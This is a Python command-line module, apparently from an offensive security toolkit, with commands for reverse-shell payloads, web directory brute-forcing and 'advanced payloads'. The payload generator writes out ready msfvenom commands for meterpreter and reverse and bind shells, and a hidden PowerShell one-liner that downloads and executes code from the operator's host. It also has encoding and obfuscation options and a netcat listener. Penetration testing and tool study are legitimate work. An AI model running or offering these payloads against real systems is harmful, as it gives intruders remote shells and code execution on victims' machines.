"""
Exploitation and Payload Commands
Payload generation, exploit tools, and penetration testing utilities
"""

import click
from core.exploit import ExploitModule
from core.brute import DirectoryBruteforcer
from ..utils.formatter import ColoredFormatter, common_options, save_results, display_results, validate_target


@click.group()
def exploit():
    """üéØ Exploitation and payload generation"""
    pass


@exploit.command()
@click.argument('shell_type', type=click.Choice([
    'bash', 'python', 'python3', 'nc', 'netcat', 'powershell', 'php', 
    'perl', 'ruby', 'nodejs', 'java', 'lua', 'awk'
]))
@click.argument('lhost')
@click.argument('lport', type=int)
@click.option('--encode', type=click.Choice(['base64', 'url', 'hex']), help='Encode the payload')
@click.option('--obfuscate', is_flag=True, help='Obfuscate the payload')
@click.option('--listener', is_flag=True, help='Generate listener command as well')
@common_options
def shell(shell_type, lhost, lport, encode, obfuscate, listener, output, format, timeout, threads):
    """Generate reverse shell payloads
    
    Examples:
        cybernox exploit shell bash 192.168.1.100 4444
        cybernox exploit shell python 10.0.0.1 9999 --encode base64
        cybernox exploit shell powershell 172.16.1.10 8080 --obfuscate --listener
        cybernox exploit shell php 192.168.1.5 1337 --output shells.json
    """
    if not validate_target(lhost):
        click.echo(ColoredFormatter.error("‚ùå Invalid LHOST format"))
        return
    
    if not (1 <= lport <= 65535):
        click.echo(ColoredFormatter.error("‚ùå Invalid port range (1-65535)"))
        return
    
    click.echo(ColoredFormatter.info(f"üîß Generating {shell_type} reverse shell"))
    click.echo(ColoredFormatter.info(f"üéØ Target: {lhost}:{lport}"))
    
    if encode:
        click.echo(ColoredFormatter.info(f"üîê Encoding: {encode.upper()}"))
    if obfuscate:
        click.echo(ColoredFormatter.info("ü•∑ Obfuscation enabled"))
    if listener:
        click.echo(ColoredFormatter.info("üëÇ Including listener command"))
    
    try:
        exploit_module = ExploitModule()
        
        with click.progressbar(length=1, label='Generating payload') as bar:
            results = exploit_module.generate_reverse_shell(shell_type, lhost, lport)
            bar.update(1)
        
        if results:
            click.echo(ColoredFormatter.success("‚úÖ Payload generated successfully"))
            
            # Display specific encoding if requested
            if encode and 'encoded' in results:
                click.echo(ColoredFormatter.header(f"\n{encode.upper()} Encoded Payload:"))
                if encode == 'base64' and 'base64' in results['encoded']:
                    click.echo(results['encoded']['base64'])
                elif encode == 'url' and 'url' in results['encoded']:
                    click.echo(results['encoded']['url'])
                elif encode == 'hex' and 'hex' in results['encoded']:
                    click.echo(results['encoded']['hex'])
            
            # Generate listener command if requested
            if listener:
                listener_cmd = generate_listener_command(lport)
                results['listener'] = listener_cmd
                click.echo(ColoredFormatter.header("\nüëÇ Listener Command:"))
                click.echo(ColoredFormatter.success(listener_cmd))
            
            if output:
                save_results(results, output, format)
            else:
                if not encode:  # Don't duplicate output if encoding was shown
                    display_results(results, format)
        else:
            click.echo(ColoredFormatter.error("‚ùå Failed to generate payload"))
            
    except Exception as e:
        click.echo(ColoredFormatter.error(f"‚ùå Payload generation failed: {e}"))


@exploit.command()
@click.argument('url')
@click.option('--wordlist', help='Custom wordlist file for directory brute force')
@click.option('--extensions', default='php,html,js,txt,asp,aspx,jsp', 
              help='File extensions to try (comma-separated)')
@click.option('--max-threads', type=int, default=20, help='Maximum number of threads')
@click.option('--recursive', is_flag=True, help='Enable recursive directory search')
@click.option('--follow-redirects', is_flag=True, help='Follow HTTP redirects')
@click.option('--hide-404', is_flag=True, help='Hide 404 responses')
@common_options
def brute(url, wordlist, extensions, max_threads, recursive, follow_redirects, hide_404, output, format, timeout, threads):
    """Brute force directories and files
    
    Examples:
        cybernox exploit brute https://example.com
        cybernox exploit brute https://target.com --wordlist custom.txt
        cybernox exploit brute https://site.com --extensions php,asp,jsp --recursive
        cybernox exploit brute https://app.com --max-threads 50 --output brute_results.json
    """
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    click.echo(ColoredFormatter.info(f"üîç Starting directory brute force on {url}"))
    
    if wordlist:
        click.echo(ColoredFormatter.info(f"üìÑ Using custom wordlist: {wordlist}"))
    else:
        click.echo(ColoredFormatter.info("üìÑ Using default wordlist"))
    
    ext_list = [f".{ext.strip('.')}" for ext in extensions.split(',')]
    click.echo(ColoredFormatter.info(f"üìÅ Extensions: {', '.join(ext_list)}"))
    click.echo(ColoredFormatter.info(f"üßµ Threads: {max_threads}"))
    
    if recursive:
        click.echo(ColoredFormatter.info("üîÑ Recursive mode enabled"))
    if follow_redirects:
        click.echo(ColoredFormatter.info("üîÄ Following redirects"))
    if hide_404:
        click.echo(ColoredFormatter.info("üö´ Hiding 404 responses"))
    
    try:
        bruteforcer = DirectoryBruteforcer()
        
        with click.progressbar(label='Brute forcing directories') as bar:
            results = bruteforcer.dir_brute(url, wordlist, ext_list, max_threads)
            bar.update(1)
        
        if results and results.get('found_directories'):
            found_count = len(results['found_directories'])
            click.echo(ColoredFormatter.success(f"‚úÖ Found {found_count} directories/files"))
            
            # Show top findings
            click.echo(ColoredFormatter.header("\nüìÅ Discovered Paths:"))
            for item in results['found_directories'][:10]:  # Show first 10
                status = item.get('status', 'Unknown')
                path = item.get('path', 'Unknown')
                click.echo(f"  {ColoredFormatter.success(status)} - {path}")
            
            if len(results['found_directories']) > 10:
                remaining = len(results['found_directories']) - 10
                click.echo(f"  ... and {remaining} more")
            
            if output:
                save_results(results, output, format)
            else:
                display_results(results, format)
        else:
            click.echo(ColoredFormatter.warning("‚ö†Ô∏è  No directories or files found"))
            
    except Exception as e:
        click.echo(ColoredFormatter.error(f"‚ùå Directory brute force failed: {e}"))


@exploit.command()
@click.argument('payload_type', type=click.Choice([
    'meterpreter', 'bind_tcp', 'bind_udp', 'reverse_tcp', 'reverse_udp',
    'web_delivery', 'powershell_empire', 'cobalt_strike'
]))
@click.option('--lhost', help='Local host IP address')
@click.option('--lport', type=int, help='Local port number')
@click.option('--rhost', help='Remote host IP address (for bind payloads)')
@click.option('--rport', type=int, help='Remote port number (for bind payloads)')
@click.option('--format', 'payload_format', type=click.Choice(['exe', 'dll', 'elf', 'raw', 'python', 'powershell']),
              help='Payload output format')
@click.option('--encoder', help='Payload encoder to use')
@click.option('--iterations', type=int, default=1, help='Number of encoding iterations')
@common_options
def payload(payload_type, lhost, lport, rhost, rport, payload_format, encoder, iterations, output, format, timeout, threads):
    """Generate advanced payloads for various scenarios
    
    Examples:
        cybernox exploit payload meterpreter --lhost 192.168.1.100 --lport 4444
        cybernox exploit payload bind_tcp --rhost 10.0.0.1 --rport 9999 --format exe
        cybernox exploit payload web_delivery --lhost 172.16.1.10 --lport 8080 --encoder base64
        cybernox exploit payload powershell_empire --lhost 192.168.1.5 --lport 443 --output payload.json
    """
    click.echo(ColoredFormatter.info(f"üîß Generating {payload_type} payload"))
    
    # Validate required parameters
    if payload_type in ['reverse_tcp', 'reverse_udp', 'meterpreter', 'web_delivery', 'powershell_empire']:
        if not lhost or not lport:
            click.echo(ColoredFormatter.error("‚ùå LHOST and LPORT required for reverse payloads"))
            return
        if not validate_target(lhost):
            click.echo(ColoredFormatter.error("‚ùå Invalid LHOST format"))
            return
        click.echo(ColoredFormatter.info(f"üéØ Reverse connection: {lhost}:{lport}"))
    
    elif payload_type in ['bind_tcp', 'bind_udp']:
        if not rhost or not rport:
            click.echo(ColoredFormatter.error("‚ùå RHOST and RPORT required for bind payloads"))
            return
        if not validate_target(rhost):
            click.echo(ColoredFormatter.error("‚ùå Invalid RHOST format"))
            return
        click.echo(ColoredFormatter.info(f"üéØ Bind connection: {rhost}:{rport}"))
    
    if payload_format:
        click.echo(ColoredFormatter.info(f"üì¶ Output format: {payload_format.upper()}"))
    if encoder:
        click.echo(ColoredFormatter.info(f"üîê Encoder: {encoder} (iterations: {iterations})"))
    
    try:
        results = {
            'payload_type': payload_type,
            'lhost': lhost,
            'lport': lport,
            'rhost': rhost,
            'rport': rport,
            'format': payload_format,
            'encoder': encoder,
            'iterations': iterations,
            'timestamp': str(click.DateTime())
        }
        
        with click.progressbar(length=iterations + 1, label='Generating payload') as bar:
            # Generate base payload
            base_payload = generate_base_payload(payload_type, lhost, lport, rhost, rport)
            results['payload'] = base_payload
            bar.update(1)
            
            # Apply encoding if specified
            if encoder:
                encoded_payload = apply_encoding(base_payload, encoder, iterations)
                results['encoded_payload'] = encoded_payload
                bar.update(iterations)
        
        click.echo(ColoredFormatter.success("‚úÖ Advanced payload generated successfully"))
        
        if output:
            save_results(results, output, format)
        else:
            display_results(results, format)
            
    except Exception as e:
        click.echo(ColoredFormatter.error(f"‚ùå Advanced payload generation failed: {e}"))


def generate_listener_command(port):
    """Generate listener command for reverse shells"""
    return f"nc -lvnp {port}"


def generate_base_payload(payload_type, lhost, lport, rhost, rport):
    """Generate base payload based on type"""
    payloads = {
        'meterpreter': f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe",
        'bind_tcp': f"msfvenom -p windows/shell/bind_tcp RHOST={rhost} RPORT={rport} -f exe",
        'reverse_tcp': f"msfvenom -p windows/shell/reverse_tcp LHOST={lhost} LPORT={lport} -f exe",
        'web_delivery': f"use exploit/multi/script/web_delivery; set LHOST {lhost}; set LPORT {lport}",
        'powershell_empire': f"powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://{lhost}:{lport}/'))\"",
    }
    return payloads.get(payload_type, f"Custom payload: {payload_type}")


def apply_encoding(payload, encoder, iterations):
    """Apply encoding to payload"""
    import base64
    import urllib.parse
    
    encoded = payload
    for i in range(iterations):
        if encoder == 'base64':
            encoded = base64.b64encode(encoded.encode()).decode()
        elif encoder == 'url':
            encoded = urllib.parse.quote(encoded)
        elif encoder == 'hex':
            encoded = encoded.encode().hex()
    
    return encoded
